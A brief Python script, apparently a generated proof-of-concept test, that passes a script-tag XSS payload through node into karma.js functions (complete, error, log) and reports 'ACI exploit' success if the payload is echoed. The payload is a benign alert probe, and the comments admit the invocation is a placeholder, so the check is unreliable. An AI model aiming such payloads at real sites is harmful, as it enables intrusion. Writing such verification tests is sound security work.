import subprocess

# Simulate the XSS attack on the vulnerable functions
def exploit_xss():
    try:
        # Assuming the functions are accessible via command line for demonstration
        # This is a placeholder to represent the exploitation attempt
        output_complete = subprocess.check_output(['node', 'static/karma.js', 'this.complete("<script>alert(\'XSS\')</script>")'])
        output_error = subprocess.check_output(['node', 'static/karma.js', 'this.error("<script>alert(\'XSS\')</script>")'])
        output_log = subprocess.check_output(['node', 'static/karma.js', 'this.log("<script>alert(\'XSS\')</script>")'])
        output_client_complete = subprocess.check_output(['node', 'client/karma.js', 'this.complete("<script>alert(\'XSS\')</script>")'])
        output_client_error = subprocess.check_output(['node', 'client/karma.js', 'this.error("<script>alert(\'XSS\')</script>")'])

        if "<script>alert('XSS')</script>" in str(output_complete) or \
           "<script>alert('XSS')</script>" in str(output_error) or \
           "<script>alert('XSS')</script>" in str(output_log) or \
           "<script>alert('XSS')</script>" in str(output_client_complete) or \
           "<script>alert('XSS')</script>" in str(output_client_error):
            print("The ACI exploit success!!!")
        else:
            print("The ACI exploit failed!!!")
    except Exception as e:
        print("The ACI exploit failed!!!")
        print(str(e))

# Run the exploit test
exploit_xss()
